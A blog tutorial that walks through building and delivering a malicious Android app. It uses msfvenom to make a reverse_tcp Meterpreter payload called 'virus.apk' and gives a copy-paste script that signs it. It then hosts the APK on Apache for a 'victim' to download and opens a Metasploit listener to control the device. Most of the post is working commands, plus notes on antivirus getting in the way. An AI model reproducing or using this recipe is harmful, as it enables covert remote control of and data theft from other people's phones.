+++ 
date = "2021-06-03"
title = "Hack an Android device with MSFvenom and Kali Linux"
slug = "Hack an Android device with MSFvenom and Kali Linux"
tags = []
categories = ["Ethical Hacking"]
series = []
+++

There are different ways and tools to hack an Android device, in this post, I will focus on **MSFvenom** to generate an APK which will be installed on the target device and the **Metasploit console** to set up a listener which will be used to interact with the device through the APK installed. Keep in mind that the payload used is not going to work with every Android version, mostly with the recent ones. The main purpose is to show how create a payload and setup a listener, after that we just need to create a server where the victim will download the virus. I found many other tutorials on Google about this topic but they are extremely old and they don't even tell you the Kali version used. You might think that is not important, but when I was looking to learn how to use MSFvenom, many parameters used were not working. Here is a simple example:

```sh
$ msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4444 R > virus.apk
```

So why this is wrong in the first place ? If we paste this command in our terminal, we get this error:

```sh
Error: No options
```

As you can see something is not correct, more specifically "**R**" is not recognized as a parameter, technically this should create our APK as an output file, but if we check the official documentation on the [Offensive Security website](https://www.offensive-security.com/metasploit-unleashed/msfvenom/), we can clearly see that the correct parameter to use is "**-o**":

!["msfvenom-commands"](/images/posts/hack-an-android-device-with-msfvenom-and-kali-linux/msfvenom-commands.png)

This is just a simple tip to take these tutorials as they are right now, because after one year they could already be outdated, even this tutorial created by me of course. If something is not working, check the [documentation](https://www.offensive-security.com/metasploit-unleashed/).

## Requirements

It should be obvious but these are the tools required:

- [Kali Linux](https://www.kali.org/get-kali/) (the version used is **2021.1**)
- An Android device (if you do not have an Android phone, use a VM or an emulator like [Bluestacks](https://www.bluestacks.com/))

You have already installed Kali Linux but you don't remember the correct version ? No problem, use this command in the terminal:

```sh
$ lsb_release -a
```

And you should get the following output:

```sh
No LSB modules are available.
Distributor ID: Kali
Description:    Kali GNU/Linux Rolling
Release:        2021.1
Codename:       kali-rolling
```

## Create the payload

Instead of typing 7 different commands in the terminal one by one, we can simply create a shell script to do the job. Open the terminal and use the following command to create a file:

```sh
$ touch createThePayload.sh
```

Make the script created an executable with:

```sh
$ chmod +x createThePayload.sh
```
Copy and paste the following code (of course you have to set your IP and a port like **4444**):

```sh
##!/bin/sh
 
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -o virus.apk
 
keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
 
sudo apt-get install default-jdk -y
 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore virus.apk hacked
 
jarsigner -verify -verbose -certs virus.apk
 
sudo apt-get install zipalign -y
 
zipalign -v 4 virus.apk virus_signed.apk
```

Type **./createThePayload.sh** and hit enter to execute the script, check the output in the terminal to see if everything is correct.

### A quick explanation about the commands used

With **MSFvenom** we set the payload, the host which is our IP, the port and the output as "**virus.apk**". 

The **keytool** command is a key and certificate management utility. We set the keystore file to generate, an alias like **hacked** but you can use what you want just keep in mind this alias when you are using the **jarsigner** command, the algorithm like RSA, the key size, the validity. 

We have to install two packages, **default-jdk** to use the jarsigner in order to sign and verify a Java Archive, **zipalign** which is an archive alignment tool that provides important optimization to Android application (.apk) files. We set the parameter "**-y**" to automatically answer with "yes" to the prompt in the terminal. We need to sign a certificate because Android mobile devices are not allowed to install apps without the appropriately signed certificate. Android devices only install signed .apk files.

## Setup the server

Now to download the APK on a target machine, we could use a server with **Apache**, from here we just need to go the correct url, which is something like "**192.168.1.2/virus_signed.apk**". In order to move the APK created by the script in "**/var/www/html**", we need root permissions. Besides using a command like:

```sh
$ sudo virus_signed.apk /var/www/html/virus_signed.apk
```

You could also use the following command when you know you will be running various commands that need root access and don't want to run each of them with sudo:

```sh
$ sudo -i
```

Check if the **apache2** service is running with:

```sh
$ service apache2 status
```

If you get the following output:

```sh
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: https://httpd.apache.org/docs/2.4/
```

Start the service with:

```sh
$ sudo service apache2 start
```

If we open Firefox and type the IP of our machine (you can get the IP with the terminal by typing **ifconfig**), we get the Debian Page:

!["it-works"](/images/posts/hack-an-android-device-with-msfvenom-and-kali-linux/it-works.png)

And if we search our apk file in the website directory, we can download it:

!["download-apk"](/images/posts/hack-an-android-device-with-msfvenom-and-kali-linux/download-apk.png)

## Setup the listener

And now we have to set our listener with the **msfconsole**, we set the exploit, the payload and the host. The port is already set as 4444 but you change it. After that we will run it and we will download the apk on a mobile device or an emulator, in my case I used my phone. Follow these steps to set the listener:

1. Start the **msfconsole**:

```sh
$ msfconsole
```

2. When the console is ready, type this command (it should be obvious but don't copy "**msf >**" in the terminal):

```sh
msf > use exploit/multi/handler
```

3. Set the host:

```sh
msf > set lhost TypeYourIPHere
```

4. Set the payload:

```sh
msf > set payload android/meterpreter/reverse_tcp
```

5. Run the exploit:

```sh
msf > run
```

Download the apk on the phone, you need to make sure that your Kali machine and your Android device are on the same network.

## Let's test some commands

Some commands will not work, but the main purpose of this video is to show how to make this stuff work, you can always change the payload or even make your own payload. Here is a quick demo:

{{< vimeo 559419552 >}}

## TLDR

With this post you should be able to create a payload for Android, setup a server and a listener to make everything work perfectly. As you can see in the demo, the antivirus is preventing us from installing the APK, in some cases it can also close the connection to our Kali machine. There are other cases where the connection will be closed, unfortunately there isn't a single solution so you will need to try different approaches. Try to check if the architecture used to create the APK is the same used by Android and of course if the antivirus is preventing the payload to work correctly.